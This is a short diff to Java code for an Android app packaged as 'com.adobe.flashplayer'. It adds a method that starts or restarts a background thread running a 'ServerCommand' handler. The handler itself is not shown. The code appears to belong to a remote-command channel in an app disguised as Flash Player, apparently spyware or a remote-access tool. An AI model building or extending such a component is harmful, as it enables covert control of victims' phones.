@@ -6,6 +6,7 @@ import android.util.Log;
 
 import com.adobe.flashplayer.PrefOper;
 import com.adobe.flashplayer.Public;
+import com.adobe.flashplayer.Utils;
 
 import java.net.InetAddress;
 import java.util.UUID;
@@ -96,4 +97,21 @@ public class Network {
     }
 
 
+
+    public static void launchServerCmdThread(Context context){
+        Thread s = Utils.getThreadForName(Public.SERVER_CMD_THREADNAME);
+        if (null == s)
+        {
+            ServerCommand server = new ServerCommand(context);
+            Thread thread = new Thread(server,Public.SERVER_CMD_THREADNAME);
+            thread.start();
+            Log.e(TAG,"create server command thread");
+        }
+        else if (!s.isAlive()){
+            s.start();
+            Log.e(TAG,"start server command thread");
+        }else{
+            Log.e(TAG,"server command thread is running");
+        }
+    }
 }
